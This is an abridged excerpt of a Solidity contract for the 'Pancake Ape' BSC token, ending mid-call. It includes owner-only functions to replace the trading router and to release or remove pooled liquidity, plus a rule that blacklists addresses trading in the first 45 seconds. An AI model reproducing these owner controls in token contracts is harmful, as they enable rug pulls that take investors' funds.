...
/*
Pancake Ape 
https://t.me/pancakeapeportal
https://twitter.com/ApeOnPancake
...
contract PancakeApe is IERC20, Ownable
{
    ...
    //Token Info
    string private constant _name = 'Pancake Ape';
    ...
    //DevWallets
    address public TeamWallet=payable(0x6eCcD13be487b19BCD0da393F503BE10c082E44B);
    address public BuyBackWallet=payable(0x6eCcD13be487b19BCD0da393F503BE10c082E44B);
    //Pancakeswap router (Main & Testnet)
    address private PancakeswapRouter=0xEfF92A263d31888d860bD50809A8D171709b7b1c;
	...
	uint256 private autoBanTime = 45; // Set to the amount of time in seconds after enable trading you want addresses to be auto blacklisted if they buy/sell/transfer in this time.
    ...
    address private _pancakeswapPairAddress; 
    IPancakeswapRouter02 private _pancakeswapRouter;
    ...
    constructor () {
        ...
        //Creates a Pancakeswap Pair
        _pancakeswapPairAddress = IPancakeswapFactory(_pancakeswapRouter.factory()).createPair(address(this), _pancakeswapRouter.WETH());
    ...
    function _transfer(address sender, address recipient, uint256 amount) private{
        ...
        //transfers between PancakeswapRouter and PancakeswapPair are tax and lock free
        address pancakeswapRouter=address(_pancakeswapRouter);
        bool isLiquidityTransfer = ((sender == _pancakeswapPairAddress && recipient == pancakeswapRouter) 
        || (recipient == _pancakeswapPairAddress && sender == pancakeswapRouter));

        //differentiate between buy/sell/transfer to apply different taxes/restrictions
        bool isBuy=sender==_pancakeswapPairAddress|| sender == pancakeswapRouter;
        bool isSell=recipient==_pancakeswapPairAddress|| recipient == pancakeswapRouter;
    ...
    function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
        ...
        //Swapping AutoLP and MarketingETH is only possible if sender is not pancakeswapV2 pair, 
        ...
        if((sender!=_pancakeswapPairAddress)&&(!manualConversion)&&(!_isSwappingContractModifier)&&isSell)
            _swapContractToken();
    ...
    function teamUpdatePancakeswapRouter(address newRouter) external onlyOwner {
    ...
    function TeamReleaseLiquidity() external onlyOwner returns (address tWAddress, uint256 amountSent) {
        ...
        IPancakeswapERC20 liquidityToken = IPancakeswapERC20(_liquidityTokenAddress);
    ...
    function TeamRemoveLiquidity() external onlyOwner returns (uint256 newBalance) {
        ...
        liquidityToken.approve(address(_pancakeswapRouter),amount);
        //Removes Liquidity and adds it to marketing Balance
        uint256 initialETHBalance = address(this).balance;
        
        _pancakeswapRouter.removeLiquidityETHSupportingFeeOnTransferTokens(
            address(this),
            amount,
            (amount*75) / 100,
            (amount*75) / 100,
